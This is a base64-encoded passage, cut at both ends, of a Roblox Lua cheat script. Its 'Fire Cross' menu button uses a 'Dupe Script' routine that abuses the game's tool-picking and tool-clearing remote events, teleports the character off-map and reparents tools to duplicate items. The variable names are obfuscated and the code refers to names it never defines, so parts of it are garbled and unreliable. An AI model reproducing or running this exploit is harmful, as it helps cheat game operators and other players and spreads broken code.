AgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgd2FpdCgxKQoKCmxvY2FsIHZhcl9ienB2cHQgPSB7CiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTYgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTkgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTExICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTIgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE0ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTggLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg4ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE2ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE5ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA1NSksCiAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgNTUpLAogICAgICAgICBWZWN0b3IzLm5ldygyNCAsIDMsIDU1KSwKICAgICAgICAgIFZlY3RvcjMubmV3KDI1ICwgMywgNTUpLAogICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgNTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDkgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDExICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIE1vdmUgdGhlIHRvb2wgdG8gdGhlIHBsYXllciBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBTZXR0aW5nIHRoZSBncmlwIHBvc2l0aW9uIGluZGV4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNXJpbTYxID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9vdTFtZ20gPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gU2V0IHRoZSBncmlwIHBvc2l0aW9uIChHcmlwUG9zKSBpZiB0aGUgdG9vbCBpcyBpbiB0aGUgcGxheWVyJ3MgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sOklzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FybigiVG9vbCIsIHRvb2wuTmFtZSwgImlzIG5vdCBpbiBjaGFyYWN0ZXIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIEZpcmUgQ3Jvc3MKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRmlyZSBDcm9zcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB2YXJfaWxrZW9kID0gImNyeXN0YWwgY3Jvc3MgbGVsIgogICAgICAgIGxvY2FsIHZhcl9vOXJ2aHEgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiRHVwZSBTY3JpcHQiLAogICAgICAgICAgICBUZXh0ID0gIlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwKICAgICAgICAgICAgQnV0dG9uMSA9ICJJIHVuZGVyc3RhbmQiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICB9KQogICAgICAgIGxvY2FsIHZhcl80ejNjMDggPSAiUGFwZXJiYWdGaXJlIgogICAgICAgIGxvY2FsIHZhcl8xNjRybXggPSAiUGFwZXJiYWdGaXJlIgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgbG9jYWwgdmFyXzhyY2lmciA9IHsKICAgICAgICAgICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCiAgICAgICAgfQogICAgICAgIGNsZWFydG9vbHJlbW90ZTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgbG9jYWwgdmFyX3Y0b3hveiA9IHRydWUKICAgICAgICBmb3IgbSA9IDEsIDU3IGRvCiAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGxvY2FsIHZhcl9vc2dsa3IgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgIFsyXSA9IHRvb2x0aGF0aXdhbnR0b2R1cGUKICAgICAgICAgICAgfQogICAgICAgICAgICBwaWNrdG9vbHJlbW90ZTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikuTmFtZSA9ICJI4m5kbOoiCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIHVudGlsIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgdmFyX2RwYTU1ayA9IHRydWUKICAgICAgICBkdXBpbmcgPSBmYWxzZQogICAgICAgIHdhaXQoKQogICAgICAgIGxvY2FsIHZhcl9iOHZzeTggPSBDRnJhbWUubmV3KC0wLjI5MDA4Njc0NiwgMC4wNzU1ODEwNzM4LCAtMC4wMTA5ODcyODE4LCAwLjA0Mzk1NjA0MTMsIDAuNTA5NzA1OTAxLCAt